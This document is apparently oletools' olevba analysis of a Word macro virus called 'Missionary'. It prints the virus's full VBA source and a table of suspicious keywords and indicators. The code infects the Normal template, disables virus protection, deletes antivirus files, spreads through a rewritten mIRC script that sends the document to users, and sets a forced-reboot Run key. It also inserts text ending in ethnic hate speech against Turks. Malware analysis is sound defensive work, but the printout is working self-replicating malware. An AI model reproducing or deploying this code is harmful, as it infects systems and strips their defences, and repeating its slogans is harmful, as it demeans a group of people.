olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Missionary-a796de8c3cd228f26b9febdd843f374c14319e5a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Missionary-a796de8c3cd228f26b9febdd843f374c14319e5a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO missionary.bas 
in file: Virus.MSWord.Missionary-a796de8c3cd228f26b9febdd843f374c14319e5a - OLE stream: 'Macros/VBA/missionary'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
WordBasic.DisableAutoMacros 0
Application.VBE.ActiveVBProject.VBComponents("missionary").Export "C:\WINDOWS\missionary.sys"
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(I).Name = "missionary" Then NormInstall = True
Next I
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(I).Name = "missionary" Then ActivInstall = True
Next I
If ActivInstall = True And NormInstall = False Then Set Dobj = NormalTemplate.VBProject
If NormInstall = True And ActivInstall = False Then Set Dobj = ActiveDocument.VBProject
Dobj.VBComponents.Import ("c:\WINDOWS\missionary.sys")
ActiveDocument.SaveAs Filename:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
NormalTemplate.Save
CommandBars("Tools").Controls("Macro").Delete
CommandBars("Tools").Controls("Templates and Add-Ins...").Delete
CommandBars("Format").Controls("Style...").Delete
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Application.DisplayAlerts = wdAlertsNone
Application.StatusBar = False
Kill "C:\Program Files\AntiViral Toolkit Pro\Avp32.exe"
Kill "C:\Program Files\AntiViral Toolkit Pro\*.avc"
Kill "C:\Program Files\Command Software\F-PROT95\*.dll"
Kill "C:\Program Files\Command Software\F-PROT95\*.exe"
Kill "C:\Program Files\McAfee\VirusScan95\Scan.dat"
Kill "C:\Program Files\McAfee\VirusScan\Scan.dat"
Kill "C:\Program Files\Norton AntiVirus\Viruscan.dat"
Kill "C:\Program Files\Symantec\Symevnt.386"
Kill "C:\Program Files\FindVirus\Findviru.drv"
Kill "C:\Program Files\Cheyenne\AntiVirus\*.dll"
Kill "C:\Program Files\Cheyenne\Common\Cshell.dll"
Kill "C:\PC-Cillin 95\Lpt$vpn.*"
Kill "C:\PC-Cillin 95\Scan32.dll"
Kill "C:\eSafe\Protect\*.dll"
Kill "c:\f-macro\f-macro.exe"
Kill "C:\TBAVW95\Tbscan.sig"
Kill "C:\Tbavw95\Tb*.*"
Kill "C:\VS95\*.dll"
End Sub

Sub AutoNew()
On Error Resume Next
K = Dir("c:\mirc\mirc32.exe")
If K = "" Then
Exit Sub
Else
m = Dir("c:\mirc\backup\needforspeedIII.doc")
If m = "" Then ActiveDocument.SaveAs "c:\mirc\backup\needforspeedIII.doc"
Kill "c:\mirc\script.ini"
Open "c:\mirc\script.ini" For Random As #1
Print #1, "[script]"
Print #1, "n0=on 1:text:*virus*:#:/msg $chan Virii Rule"
Print #1, "n1=on 1:text:*virus*:#:/join #vir | /amsg I am infected with Missionary virus by PhreakX"
Print #1, "n2=on 1:text:*missionary*:#:/amsg I am infected with Missionary virus by PhreakX"
Print #1, "n3=on 1:text:*turkey*:#:/msg $chan Turkey sucks"
Print #1, "n4=on 1:join:#:/send $nick c:\mirc\backup\needforspeedIII.doc"
Close #1
End If
End Sub

Sub FileSave()
On Error Resume Next
Randomize
If Day(Now) = 20 Then
MsgBox "Missionary Virus", vbCritical, "3C"
Selection.MoveStart
Selection.TypeText "I am a Missionary, my mission is to inform."
Selection.TypeText " The information that I will give you today concerns injustice."
Selection.TypeText " On the 20th of July 1974 the Turkish troops under the commands of"
Selection.TypeText " Bulet Eccevit invated Cyprus, took over our houses, killed our relatives"
Selection.TypeText " raped our mothers and sisters and they still live there."
Selection.TypeText " They call southern Cyprus 'Turkey', what they don't understand is that"
Selection.TypeText " no matter what they call it, it is still Cyprus."
Selection.TypeText " All you Turks out there who believe Cyprus belongs to you"
Selection.TypeText " watch out, because someone is after you, and this someone is"
Selection.TypeText " PhreakX"
Selection.TypeText "---3C Group wants freedom for Cyprus and not war, but as long as"
Selection.TypeText " people like Bulet Eccevit, Raouf Degtas and Tatsun Chiller are alive"
Selection.TypeText " freedom remains a dream..."
Selection.TypeText "+-=PhreakX=-+"
Selection.TypeText "   Visit 3C at http://come.to/CCCriminals"
Selection.TypeText "   -A Good Turk Is A Dead Turk-"
Beep
MsgBox "You are infected with Missionary Virus by PhreakX. Click on OK if you hate Turks", vbApplicationModal, "Missionary Virus"
End If
ActiveDocument.Save
End Sub

Sub AutoClose()
If Month(Now()) = 8 And Day(Now()) = 14 Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "reboot") = "c:\windows\rundll.exe user.exe,exitwindowsexec"
Shell "C:\WINDOWS\RUNDLL.EXE user.exe,exitwindowsexec"
End If
End Sub

Sub EditPaste()
MsgBox "No paste for you boy."
MsgBox "Missionary virus doesn't allow you"
End Sub

Sub EditCopy()
MsgBox "Error on procedure Copy"
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |http://come.to/CCCri|URL                                          |
|          |minals              |                                             |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |Avp32.exe           |Executable file name                         |
|IOC       |Cshell.dll          |Executable file name                         |
|IOC       |Scan32.dll          |Executable file name                         |
|IOC       |macro.exe           |Executable file name                         |
|IOC       |mirc32.exe          |Executable file name                         |
|IOC       |rundll.exe          |Executable file name                         |
|IOC       |user.exe            |Executable file name                         |
|IOC       |RUNDLL.EXE          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

